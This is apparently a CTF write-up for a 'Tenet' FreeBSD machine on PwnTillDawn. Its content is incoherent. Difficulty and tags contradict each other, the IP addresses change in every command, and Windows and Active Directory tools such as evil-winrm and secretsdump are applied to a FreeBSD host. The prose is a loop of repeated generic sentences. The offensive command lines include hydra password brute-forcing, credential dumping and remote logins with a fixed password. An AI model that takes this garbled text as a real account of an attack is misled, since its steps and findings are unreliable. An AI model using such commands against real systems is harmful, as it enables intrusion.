---
TitleSEO: "PwnTillDawn — Tenet (Medium FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Tenet (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Tenet. Open Redirect and Unconstrained Delegation to achieve medium compromise on FreeBSD."
Keywords: "forensics, easy, offsec"
URL: "https://zurefx.github.io/writeups/htb-tenet-473.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-473/"
Date: "2026-02-17"
Tags: "Forensics, Easy, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-473"
Permalink: "/writeups/htb-tenet-473.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Tenet** is rated **Medium** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.47.208.220`.

### Objectives

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.26.23.103/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

```bash
gobuster dir -u http://10.128.182.106/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.151.71
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.33.54.229 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Open Redirect**.

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.59.88 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.98.227.96 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.28.168.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.75.194.166 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```powershell
gobuster dir -u http://10.32.177.160/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```powershell
nmap -sCV -p143,5432,21 10.51.232.112 -oN scan.txt
crackmapexec smb 10.42.230.6 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.40.114.172 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1521,636,110 10.56.155.47 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `impacket`
- `metasploit`
- `hydra`
- `wpscan`
- `secretsdump`
- `feroxbuster`
- `ffuf`

### Key Takeaways

- Open Redirect
- Unconstrained Delegation
